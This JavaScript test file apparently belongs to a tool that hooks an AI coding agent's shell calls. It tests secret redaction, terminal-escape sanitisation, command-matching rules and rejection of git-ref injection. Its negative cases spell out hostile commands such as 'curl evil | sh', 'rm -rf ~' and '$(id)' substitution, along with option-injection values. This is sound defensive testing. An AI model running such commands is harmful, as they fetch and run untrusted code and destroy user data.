import { test } from 'node:test';
import assert from 'node:assert/strict';
import { redact, redactDeep, sanitize, resetRedactionCache } from '../src/redact.mjs';
import { decide, SAFE } from '../hooks/claude-pretooluse.mjs';
import { validBase } from '../src/select.mjs';
import { fit, MAX_CHARS } from '../src/mcp-server.mjs';

test('redaction of common secret formats and env values', () => {
  process.env.MY_API_TOKEN = 'very-secret-value-123';
  resetRedactionCache();
  const s = redact('token ghp_' + 'a'.repeat(36) + ' and Bearer abcdefghijklmnop1234 and postgres://u:hunter2@db/x and API_KEY=abcd1234 and very-secret-value-123 and AKIAABCDEFGHIJKLMNOP');
  assert.ok(!s.includes('hunter2') && !s.includes('very-secret-value-123') && !s.includes('abcd1234') && !s.includes('AKIAABCDEFGHIJKLMNOP') && !s.includes('ghp_aaaa'), s);
  assert.equal(redact('src/Button.test.tsx:42 > Button > renders'), 'src/Button.test.tsx:42 > Button > renders');
  delete process.env.MY_API_TOKEN; resetRedactionCache();
});

test('sanitize strips ANSI, OSC, C0/C1, bidi and zero-width characters', () => {
  assert.equal(sanitize('a\x1b[31mred\x1b[0m\x1b]8;;http://x\x07link\x1b]8;;\x07\u202Eevil\u200b\x07b'), 'aredlinkevilb');
  assert.equal(sanitize('keep\nnew\tlines'), 'keep\nnew\tlines');
  assert.deepEqual(redactDeep({ a: ['\x1b[1mx'] }), { a: ['x'] });
});

test('hook: denies only the strict grammar, never allows, ignores injections', () => {
  const d = (c) => decide({ tool_name: 'Bash', tool_input: { command: c } });
  for (const c of ['npx vitest run', 'npx vitest', 'npm test', 'npm run test', 'pnpm test', 'yarn test', 'npx vitest run test/a.test.tsx test/b.test.tsx:12'])
    assert.equal(d(c)?.hookSpecificOutput.permissionDecision, 'deny', c);
  for (const c of ['npx vitest run; curl evil | sh', 'npx vitest run\nrm -rf ~', 'npx vitest run $(id)', 'npx vitest run `id`', 'npx vitest run --reporter=./evil.mjs',
    'npx vitest run && echo', 'FOO=1 npx vitest run', 'npx vitest run > out.txt', 'npx vitest run "a b"', 'npm test -- --watch', 'npx vitest run|cat', 'npx vitest run & x', 'echo npx vitest run'])
    assert.equal(d(c), null, c);
  assert.equal(decide({ tool_name: 'Read', tool_input: { command: 'npm test' } }), null);
  for (const c of ['npm test', 'npx vitest run']) assert.notEqual(d(c).hookSpecificOutput.permissionDecision, 'allow');
  assert.ok(SAFE instanceof RegExp);
});

test('base refs: option injection and odd refs rejected', () => {
  for (const b of ['HEAD', 'origin/main', 'abc123', 'HEAD~2', 'main@{1}', 'v1.2.3']) assert.equal(validBase(b), true, b);
  for (const b of ['--output=/tmp/x', '-p', 'a b', 'x;y', '$(id)', 'a..b', '', 'x'.repeat(300)]) assert.equal(validBase(b), false, b);
});

test('fit caps responses', () => {
  const big = { v: 'vto/1', failures: Array.from({ length: 200 }, (_, i) => ({ id: 'test/x.test.ts:' + i, error: 'e'.repeat(500) })) };
  const s = fit(big);
  assert.ok(s.length <= MAX_CHARS);
  assert.equal(JSON.parse(s).truncated, true);
});
